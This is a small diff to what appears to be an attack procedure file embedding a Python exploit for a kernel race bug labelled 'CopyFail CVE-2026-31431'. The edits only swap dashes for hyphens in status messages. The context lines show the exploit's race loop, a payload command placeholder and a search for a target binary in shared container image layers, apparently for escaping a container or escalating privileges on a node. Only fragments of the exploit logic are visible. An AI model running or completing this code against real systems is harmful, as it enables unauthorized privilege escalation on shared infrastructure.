@@ -120,7 +120,7 @@ procedures:
                               return True
                           if i % 1000 == 0 and i > 0:
                               print(f"[*] Round {i}…")
-                      print("[-] Race not won within max rounds — kernel may be patched")
+                      print("[-] Race not won within max rounds - kernel may be patched")
                       return False
                   finally:
                       os.close(target_fd)
@@ -130,7 +130,7 @@ procedures:
 
               payload_cmd = "${PAYLOAD}"
               kernel = "${KERNEL_VERSION}" if "${KERNEL_VERSION}" else "unknown"
-              print(f"[*] CopyFail CVE-2026-31431 — node kernel: {kernel}")
+              print(f"[*] CopyFail CVE-2026-31431 - node kernel: {kernel}")
               target = find_target()
               if not target:
                   print("[-] No suitable target binary found in shared image layers")
